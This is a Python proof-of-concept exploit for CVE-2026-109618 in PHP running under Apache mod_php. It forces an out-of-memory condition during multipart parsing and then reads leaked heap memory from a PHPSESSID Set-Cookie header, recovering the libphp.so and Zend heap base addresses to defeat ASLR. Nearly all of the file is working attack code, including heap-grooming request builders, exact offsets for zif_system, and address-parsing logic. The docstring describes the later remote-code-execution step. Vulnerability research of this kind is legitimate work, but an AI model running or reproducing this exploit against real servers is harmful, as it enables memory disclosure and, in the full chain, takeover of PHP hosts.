#!/usr/bin/env python3
"""
CVE-2026-109618 -- Information disclosure via PHPSESSID cookie.

Demonstrates the genuine CVE-2026-109618 vulnerability: OOM during
multipart parsing leaves stale session state in the Apache worker.
A second request on the same worker reads the stale PS(id) pointer,
causing Apache to emit a Set-Cookie containing heap memory.

Two stages:
  Stage 1: Leak Zend MM chunk base address (4096-byte cookie)
  Stage 2: Leak libphp.so load base address (16-byte cookie)

Together these defeat ASLR. In the full exploit chain, these addresses
are used to construct a fake HashTable that redirects pDestructor to
zif_system for RCE. This script demonstrates the leak only.

Tested on: php:8.4.26-apache (mod_php, prefork)
Profile:   php-8.4.26-bookworm-amd64
Requires:  display_errors=On, session.upload_progress.enabled=On,
           session.use_strict_mode=0, memory_limit finite (tested at 8M)

Note: This script has no worker pinning. With multiple prefork workers,
the OOM trigger and leak request may hit different workers and the leak
fails. Use poc_rce.py for multi-worker targets (it handles pinning).

For authorized security research and local lab use only.
"""

import socket
import struct
import sys
import time
import urllib.parse
from collections import Counter

# Profile: php-8.4.26-bookworm-amd64
STAGE1_N = 841
STAGE1_FORGE_LEN = 79
STAGE2_T = 406
STAGE2_V = 16
DTOR_OFFSET = 0x65eb60    # zval_ptr_dtor offset from libphp base
ZIF_OFFSET = 0x465370     # zif_system offset from libphp base
OOM_MARGIN_MB = 12


def make_part(boundary, name, body, filename=None):
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return b"--" + boundary + b"\r\n" + disp.encode() + b"\r\n\r\n" + body


def send_post(host, port, path, boundary, body, timeout=120):
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        data = headers + body
        off = 0
        while off < len(data):
            off += sock.send(data[off:off + 1048576])
        resp = b""
        while True:
            try:
                c = sock.recv(65536)
                if not c:
                    break
                resp += c
            except socket.timeout:
                break
        sock.close()
        return resp
    except Exception as e:
        try:
            sock.close()
        except Exception:
            pass
        return None


def get_cookie(resp):
    if not resp:
        return b""
    for line in resp.split(b"\r\n"):
        if line.lower().startswith(b"set-cookie:") and b"PHPSESSID=" in line:
            raw = line.split(b"PHPSESSID=")[1].split(b";")[0]
            try:
                return urllib.parse.unquote_to_bytes(raw.decode("latin-1"))
            except Exception:
                return raw
    return b""


def oom_body_stage1(boundary, memory_limit_mb):
    """OOM trigger for stage 1: 1001 x 1B fields."""
    body = b""
    for i in range(1001):
        body += make_part(boundary, f"p{i:04d}", b"x") + b"\r\n"
    body += make_part(boundary, "PHPSESSID", b"\x00") + b"\r\n"
    body += make_part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"pwn") + b"\r\n"
    body += make_part(boundary, "f", b"A" * 4096, filename="up.bin") + b"\r\n"
    big = (memory_limit_mb + OOM_MARGIN_MB) * 1024 * 1024
    body += make_part(boundary, "huge", b"X" * big) + b"\r\n"
    body += b"--" + boundary + b"--\r\n"
    return body


def oom_body_stage2(boundary, memory_limit_mb):
    """OOM trigger for stage 2: 1001 x 39B fields (different heap layout)."""
    body = b""
    for i in range(1001):
        body += make_part(boundary, f"f{i:04d}"[:5], b"x" * 39) + b"\r\n"
    body += make_part(boundary, "PHPSESSID", b"\x00") + b"\r\n"
    body += make_part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"pwn") + b"\r\n"
    body += make_part(boundary, "f", b"A" * 4096, filename="up.bin") + b"\r\n"
    big = (memory_limit_mb + OOM_MARGIN_MB) * 1024 * 1024
    body += make_part(boundary, "huge", b"X" * big) + b"\r\n"
    body += b"--" + boundary + b"--\r\n"
    return body


def stage1_body(boundary, sid):
    """Build the stage-1 leak request body."""
    body = b""
    body += make_part(boundary, "PHPSESSID", sid.encode()) + b"\r\n"
    body += make_part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"pwn") + b"\r\n"
    for i in range(STAGE1_N):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        body += make_part(boundary, str(1000 + i), val.encode()) + b"\r\n"
    forge = bytearray(b"A" * STAGE1_FORGE_LEN)
    if STAGE1_FORGE_LEN >= 0x19:
        struct.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
    body += make_part(boundary, "1999", bytes(forge)) + b"\r\n"
    body += b"--" + boundary + b"--\r\n"
    return body


def stage2_body(boundary, sid):
    """Build the stage-2 leak request body."""
    body = b""
    body += make_part(boundary, "PHPSESSID", sid.encode()) + b"\r\n"
    body += make_part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"pwn") + b"\r\n"
    for i in range(983):
        cnt = STAGE2_V if i == STAGE2_T else 1
        for j in range(cnt):
            body += make_part(boundary, f"a{i:04d}[{j}]", b"x" * 16) + b"\r\n"
    body += b"--" + boundary + b"--\r\n"
    return body


def find_chunk_base(raw):
    if len(raw) < 16:
        return 0
    c = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x10000 < v < 0x0001000000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 4 else 0


def find_libphp_base(raw):
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x10000 < p < 0x0001000000000000):
        return 0
    if (p & 0xFFF) != (DTOR_OFFSET & 0xFFF):
        return 0
    base = p - DTOR_OFFSET
    return base if base & 0xFFF == 0 else 0


def main():
    host = "127.0.0.1"
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8896
    path = "/index.php"
    mem_mb = int(sys.argv[2]) if len(sys.argv) > 2 else 8
    boundary = b"S" * 17

    print("=" * 60)
    print("CVE-2026-109618: PHPSESSID Information Disclosure PoC")
    print("=" * 60)
    print(f"Target:       http://{host}:{port}{path}")
    print(f"memory_limit: {mem_mb}M")
    print(f"Profile:      php-8.4.26-bookworm-amd64")
    print()

    # --- Stage 1: Zend MM chunk base ---
    print("[Stage 1] Leak Zend MM chunk base address")
    print("  Sending OOM trigger (request A)...")
    body_a = oom_body_stage1(boundary, mem_mb)
    resp_a = send_post(host, port, path, boundary, body_a)
    if not resp_a or b"Allowed memory size" not in resp_a:
        print("  [!] OOM not triggered. Check memory_limit and post_max_size.")
        return 1
    print("  OOM triggered.")

    time.sleep(0.3)

    print("  Sending leak request (request B)...")
    body_b = stage1_body(boundary, "stage1-leak")
    resp_b = send_post(host, port, path, boundary, body_b, 30)
    cookie1 = get_cookie(resp_b)
    print(f"  Cookie size: {len(cookie1)} bytes")

    chunk_base = find_chunk_base(cookie1) if len(cookie1) > 40 else 0
    if not chunk_base:
        print("  [!] Stage 1 failed: no chunk base in cookie.")
        if len(cookie1) > 0:
            print(f"      Cookie hex: {cookie1[:40].hex()}")
        return 1

    print(f"  [+] Zend MM chunk base: {hex(chunk_base)}")
    print()

    # --- Stage 2: libphp.so base ---
    print("[Stage 2] Leak libphp.so load base address")
    print("  Sending OOM trigger (request A)...")
    resp_a2 = send_post(host, port, path, boundary, oom_body_stage2(boundary, mem_mb))
    if not resp_a2 or b"Allowed memory size" not in resp_a2:
        print("  [!] OOM not triggered.")
        return 1
    print("  OOM triggered.")

    time.sleep(0.3)

    print("  Sending leak request (request B)...")
    body_b2 = stage2_body(boundary, "stage2-leak")
    resp_b2 = send_post(host, port, path, boundary, body_b2, 60)
    cookie2 = get_cookie(resp_b2)
    print(f"  Cookie size: {len(cookie2)} bytes")

    libphp_base = find_libphp_base(cookie2)
    if not libphp_base:
        print("  [!] Stage 2 failed: no pDestructor match in cookie.")
        if len(cookie2) > 0:
            print(f"      Cookie hex: {cookie2[:32].hex()}")
        return 1

    zif_system = libphp_base + ZIF_OFFSET
    print(f"  [+] libphp.so base:    {hex(libphp_base)}")
    print(f"  [+] zif_system:        {hex(zif_system)}")
    print(f"  [+] zval_ptr_dtor:     {hex(libphp_base + DTOR_OFFSET)}")
    print()

    # --- Summary ---
    print("=" * 60)
    print("ASLR BYPASS COMPLETE")
    print("=" * 60)
    print(f"  Zend MM chunk base:  {hex(chunk_base)}")
    print(f"  libphp.so base:      {hex(libphp_base)}")
    print(f"  zif_system:          {hex(zif_system)}")
    print(f"  zval_ptr_dtor:       {hex(libphp_base + DTOR_OFFSET)}")
    print()
    print("These addresses defeat ASLR. In the full chain, they are")
    print("used to construct a fake HashTable that redirects the")
    print("session progress destructor to zif_system for RCE.")
    print()
    print("The information was leaked purely via Set-Cookie headers.")
    print("No application vulnerability or authentication required.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
